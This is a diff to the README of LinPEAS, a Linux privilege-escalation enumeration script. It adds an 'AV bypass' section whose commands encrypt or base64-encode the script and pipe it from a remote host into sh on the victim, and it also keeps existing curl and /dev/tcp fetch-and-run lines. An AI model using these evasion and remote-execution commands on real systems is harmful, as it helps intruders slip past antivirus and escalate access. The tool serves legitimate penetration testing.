@@ -17,11 +17,11 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 
 ```bash
 #Local network
-python -m SimpleHTTPServer 80
+sudo python -m SimpleHTTPServer 80
 curl 10.10.10.10/linpeas.sh | sh
 
 #Without curl
-nc -q 5 -lvnp 80 < linpeas.sh
+sudo nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
@@ -29,6 +29,19 @@ cat < /dev/tcp/10.10.10.10/80 | sh
 #Output to file
 linpeas -a > /dev/shm/linpeas.txt
 less -r /dev/shm/linpeas.txt #Read with colors
+```
+
+## AV bypass
+```bash
+#open-ssl encryption
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
+
+#Base64 encoded
+base64 -w0 linpeas.sh > lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
 **Use the parameter `-a` to execute all these checks.**
@@ -39,7 +52,7 @@ The goal of this script is to search for possible **Privilege Escalation Paths**
 
 This script doesn't have any dependency.
 
-It uses **/bin/sh** sintax, so can run in anything supporting `sh` (and the binaries and parameters used).
+It uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the binaries and parameters used).
 
 By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.
 
@@ -143,7 +156,7 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Date
   - [x] System stats
   - [x] Environment vars
-  - [x] SElinux
+  - [x] AppArmor, grsecurity, Execshield, PaX, SElinux, ASLR
   - [x] Printers
   - [x] Dmesg (signature verifications)
   - [x] Container?
@@ -221,6 +234,9 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Mosquitto
   - [x] Neo4j
   - [x] Cloud-Init
+  - [x] Erlang Cookie
+  - [X] GVM config
+  - [x] IPSEC files
 
 
 - **Generic Interesting Files**
@@ -228,6 +244,7 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Capabilities
   - [x] /etc/ld.so.conf.d/
   - [x] Users with capabilities
+  - [x] Files with ACLs
   - [x] .sh scripts in PATH
   - [x] scripts in /etc/profile.d
   - [x] Hashes (passwd, group, shadow & master.passwd)
